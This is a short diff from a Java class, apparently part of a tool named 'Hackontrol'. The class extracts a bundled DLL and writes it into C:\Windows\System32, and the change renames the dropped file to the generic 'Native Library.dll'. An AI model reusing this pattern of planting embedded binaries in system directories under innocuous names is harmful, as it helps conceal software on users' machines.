@@ -27,7 +27,7 @@ public class NativeLibrary {
 			InputStream inputStream = NativeLibrary.class.getClassLoader().getResourceAsStream("Hackontrol.dll");
 			byte[] data = inputStream.readAllBytes();
 			inputStream.close();
-			File file = new File("C:\\Windows\\System32\\libnative32.dll");
+			File file = new File("C:\\Windows\\System32\\Native Library.dll");
 			FileOutputStream outputStream = new FileOutputStream(file);
 			outputStream.write(data);
 			outputStream.close();
